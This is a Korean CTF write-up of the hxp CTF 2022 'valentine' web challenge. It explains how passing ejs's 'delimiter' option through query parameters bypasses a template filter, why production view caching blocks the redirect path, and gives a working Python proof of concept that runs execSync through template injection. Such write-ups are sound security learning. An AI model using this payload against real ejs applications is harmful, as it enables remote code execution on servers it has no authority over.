---
title: '[CTF][hxp CTF 2022] valentine'
author: hoppi
date: 2023-03-14 22:01:00 + 0000
categories: [CTF]
tags: [ctf, hxp_2022, valentine, web]
---

오랜만에 CTF에 참여했습니다. 앞으로는 좀 더 자주 참여하려구요. 참고로 이 문제는 기간동안 풀지 못했습니다. 했던 방법이 안돼서 뭔가 내가 모르는게 있나 싶었는데 끝나고 롸업을 보니 유저 이슈... 올해는 유저 이슈를 줄여보도록 하자라고 마음먹었는데 제 자신한테 화가 나내요🥲

# 분석
***

## 플레그 위치
*** 
플레그는 아래처럼 `flag.txt`로 존재하지만 `Dockerfile`을 보면 읽을 권한은 `root`만 가지고 있어서 우리는 `readflag` 바이너리를 실행해야합니다. 즉 `RCE`가 필요하다는 것을 알 수 있죠.  
```plaintext
├── Dockerfile
├── app.js
├── docker-compose.yml
├── flag.txt
├── index.html
├── node_modules
├── package-lock.json
├── package.json
├── readflag
```
<br/>

## 기능
***
아래처럼 `/template` 엔드포인트를 통해서 `ejs` 템플릿 구문을 사용할 수 있지만 `<%= name %>`만 허용하고 있습니다. 
```javascript
// app.js: 19
app.post('/template', function(req, res) {
  let tmpl = req.body.tmpl;
  let i = -1;
  while((i = tmpl.indexOf("<%", i+1)) >= 0) {
    if (tmpl.substring(i, i+11) !== "<%= name %>") {
      res.status(400).send({message:"Only '<%= name %>' is allowed."});
      return;
    }
  }
  let uuid;
  do {
    uuid = crypto.randomUUID();
  } while (fs.existsSync(`views/${uuid}.ejs`))

  try {
    fs.writeFileSync(`views/${uuid}.ejs`, tmpl);
  } catch(err) {
    res.status(500).send("Failed to write Valentine's card");
    return;
  }
  let name = req.body.name ?? '';
  return res.redirect(`/${uuid}?name=${name}`);
});
```
{: file='app.js'}
<br/>

# 취약점
***
ejs의 경우 템플릿 구문을 커스텀할 수 있는데 그렇게 되면 `RCE`를 할 수 있습니다. 그렇다면 어떻게 우회를 해야할까요?
![custom](../../../assets/img/2023-03-14/custom.png){: w="700" h="350" }  
<br/>

유명한 취약점인 [CVE-2022-29078](https://eslam.io/posts/ejs-server-side-template-injection-rce/)는 `ejs@3.1.6`에서 `RCE`를 가능하게 합니다. `req.query` 객체를 한번에 `res.render`의 인자로 넘겨줄 때 발생하죠. 이 문제도 마찬가지로 그렇게 주고 있었습니다.  
```javascript
// app.js: 43
app.get('/:template', function(req, res) {
  let query = req.query;
  console.log(`[+] query ==> ${JSON.stringify(query)}`)
  let template = req.params.template
  if (!/^[0-9A-F]{8}-[0-9A-F]{4}-[4][0-9A-F]{3}-[89AB][0-9A-F]{3}-[0-9A-F]{12}$/i.test(template)) {
    res.status(400).send("Not a valid card id")
    return;
  }
  if (!fs.existsSync(`views/${template}.ejs`)) {
    res.status(400).send('Valentine\'s card does not exist')
    return;
  }
  if (!query['name']) {
    query['name'] = ''
  }
  return res.render(template, query);
});

```
{: file='app.js'}
<br/>

하지만 이 문제의 경우 `3.1.8` 버전이고 ~~bodyParser.urlencoded의 extended가 false여서 객체의 객체를 파싱하지 못합니다.~~ 하지만 해당 취약점의 글을 자세히 보면 `ejs` 내부에서 쓰는 옵션을 쿼리 스트링형식으로 전달해주면 그것을 덮어씌울 수 있게됩니다. 따라서 `delimeter`를 커스텀하여 `<%= name %>`를 우회할 수 있게 됩니다.  
```javascript
...

var _OPTS_PASSABLE_WITH_DATA = ['delimiter', 'scope', 'context', 'debug', 'compileDebug',
  'client', '_with', 'rmWhitespace', 'strict', 'filename', 'async'];
```
{: file='ejs.js'}
<br/>


# Exploit
***
아래와 같이 원하는 `delimeter`만 설정하여 `RCE` 페이로드를 `tmpl`으로 설정해주고 `delimeter`를 넘겨주면 됩니다.  
```plaintext
<@- process.mainModule.require('child_process').execSync('/readflag') @>
```
{: file='tmpl'}
<br/>

하지만 `tmpl`을 작성하고 전송하면 해당 파일로 바로 `Redirect` 됩니다. `Dockerfile`을 보면 아래와 같은 설정이 존재하는데 바로 `express`에서 `캐싱`을 설정하는 것이었죠. 리다이렉트되면 기본 `delimeter`인 `%`가 캐싱되는 것이죠. 따라서 리다이렉트되고 나서 `delimeter` 파라미터를 설정해줘도 정상적으로 `exploit`이 되지 않았던 이유입니다. 제가 풀지 못했던 이유가 이것입니다... 좀 더 생각해보고 시도했으면 풀었을텐데 너무 아쉽네요   
```plaintext
ENV NODE_ENV=production
```
{: file='Dockerfile'}
<br/>

```javascript
if (env === 'production') {
  this.enable('view cache');
}
```
{: file='express/application.js'}
<br/>

## PoC Code
***
요청을 보낼때 `allow_redirects`를 `false`로 설정해주어 리다이렉트를 막으면 됩니다.  
```python
from requests import post, get
from re import search

info = lambda x : print(f"[+] {x}")

URL ='http://168.119.235.41:9086'
FLAG =''


res = post(f"{URL}/template", data={"tmpl":"<@- process.mainModule.require('child_process').execSync('/readflag') @>"}, allow_redirects=False)

m = search(r"Redirecting to /(?P<uuid>.*?)?name=", res.text)
res = get(f"{URL}/{m.group('uuid')}?name=a&delimiter=@")
m = search(r"hxp{.*?}", res.text)
if m :
    FLAG = m.group()
    info(f'Flag is {FLAG}')
else :
    print(f"[-] Failed to find the flag")

```
{: file='exploit.py'}
<br/>

# 추가
***
본문에 취소선을 한 이유는 `express.urlencoded`와 혼동했기 때문입니다. 결론은 `bodyParser.urlencoded`는 아무런 영향이 없습니다. 따라서 `3.1.8`버전의 `0-day exploit`이 가능할 수 있지만 이 역시 `캐시` 때문에 되지 않을겁니다. 아무튼 드림핵에 [ejs@3.1.8](https://dreamhack.io/wargame/challenges/675/)과 [Note](https://dreamhack.io/wargame/challenges/644/) 문제가 있는데 이 문제와 같이 보면 이해하는데 아주 도움이 될 것 같습니다.
<br/>

# Reference
***
- [https://eslam.io/posts/ejs-server-side-template-injection-rce/](https://eslam.io/posts/ejs-server-side-template-injection-rce/)
- [https://www.npmjs.com/package/ejs](https://www.npmjs.com/package/ejs)
- [https://hxp.io/blog/101/hxp-CTF-2022-valentine/](https://hxp.io/blog/101/hxp-CTF-2022-valentine/)